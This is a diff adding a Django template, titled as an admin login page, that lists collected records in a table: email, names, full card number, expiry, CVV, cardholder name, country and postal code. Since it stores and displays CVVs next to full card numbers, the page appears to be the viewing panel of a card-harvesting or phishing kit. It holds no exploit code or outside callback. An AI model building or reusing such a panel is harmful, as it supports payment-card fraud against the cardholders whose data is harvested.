@@ -1,0 +1,105 @@
+{% load static tailwind_tags %}
+<!DOCTYPE html>
+<html lang="vi">
+    {% load static %}
+<head>
+    {% tailwind_css %}
+    <!-- 1. Thẻ charset, viewport, title -->
+    <meta http-equiv="content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <title>Đăng nhập ADMIN</title>
+
+    <!-- 2. Thẻ SEO cơ bản -->
+    <meta name="description" content="">
+    <meta name="keywords" content="Đăng nhập tài khoản" />
+    <link rel="canonical" href="{{domain}}/admin/login" />
+
+    <meta name='revisit-after' content='1 days' />
+    <meta name="robots" content="noodp,index,follow" />
+
+    <!-- 3. Favicon -->
+    <!-- <link rel="shortcut icon" href="{{domain}}/upload/website/logo.png" type="image/x-icon" /> -->
+
+    <!-- 4. Open Graph tags (Facebook, Zalo...) -->
+    <meta property="og:type" content="website">
+
+    <meta property="og:title" content="Đăng nhập tài khoản">
+    <meta property="og:description" content="">
+    <meta property="og:image" content="{{domain}}/upload/website/logo.png">
+    <meta property="og:image:secure_url" content="{{domain}}/upload/website/logo.png">
+    <meta property="og:url" content="{{domain}}/admin/login">
+
+    <meta property="og:site_name" content="Hydrinity">
+
+    <!-- 5. Phần còn lại -->
+
+    <!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"> -->
+
+    <link rel="stylesheet" href="/static/css/dist/styles.css?v=1743858420">
+    <link rel="stylesheet" href="/static/styles.css">
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <!-- Swiper CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css">
+    <!-- Swiper JS -->
+    <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+
+    <style>
+        @font-face {
+            font-family: 'UTM Aptima';
+            src: url('static/fonts/00022-UTM-Aptima.ttf') format('truetype');
+            font-weight: 400;
+            font-style: normal;
+        }
+
+        @font-face {
+            font-family: 'UTM Aptima';
+            src: url('static/fonts/00024-UTM-AptimaBoldItalic.ttf') format('truetype');
+            font-weight: 700;
+            font-style: italic;
+        }
+
+        @font-face {
+            font-family: 'UTM Bebas';
+            src: url('static/fonts/00041-UTM-Bebas.ttf') format('truetype');
+            font-weight: 700;
+            font-style: italic;
+        }
+
+        body {
+            font-family: 'UTM Aptima', sans-serif !important;
+        }
+    </style>
+
+</head>
+
+<body class="w-full min-h-screen flex items-start justify-center bg-red-500 p-3" style="background: url('/upload/website/background.png') no-repeat center center/cover;">
+    <div class="flex flex-col bg-white w-full overflow-x-auto border-[1px] border-stone-400 divide-y-[1px] divide-stone-400">
+        <div class="flex w-full font-bold divide-x-[1px] divide-stone-400">
+            <div class="w-[20%] flex justify-center items-center p-2">Email</div>
+            <div class="w-[10%] flex justify-center items-center p-2">First_name</div>
+            <div class="w-[10%] flex justify-center items-center p-2">Last_name</div>
+            <div class="w-[10%] flex justify-center items-center p-2">Card_number</div>
+            <div class="w-[10%] flex justify-center items-center p-2">MMYY</div>
+            <div class="w-[10%] flex justify-center items-center p-2">CVV</div>
+            <div class="w-[10%] flex justify-center items-center p-2">Name_Card</div>
+            <div class="w-[10%] flex justify-center items-center p-2">Country</div>
+            <div class="w-[10%] flex justify-center items-center p-2">Postal_code</div>
+        </div>
+        {% for i in list_product %}
+        <div class="flex w-full font-medium divide-x-[1px] divide-stone-400">
+            <div class="w-[20%] flex justify-center items-center p-2">{{i.Email}}</div>
+            <div class="w-[10%] flex justify-center items-center p-2">{{i.First_name}}</div>
+            <div class="w-[10%] flex justify-center items-center p-2">{{i.Last_name}}</div>
+            <div class="w-[10%] flex justify-center items-center p-2">{{i.Card_number}}</div>
+            <div class="w-[10%] flex justify-center items-center p-2">{{i.MMYY}}</div>
+            <div class="w-[10%] flex justify-center items-center p-2">{{i.CVV}}</div>
+            <div class="w-[10%] flex justify-center items-center p-2">{{i.Name_Card}}</div>
+            <div class="w-[10%] flex justify-center items-center p-2">{{i.Country}}</div>
+            <div class="w-[10%] flex justify-center items-center p-2">{{i.Postal_code}}</div>
+        </div>
+        {% endfor %}
+    </div>
+</body>
+
+</html>
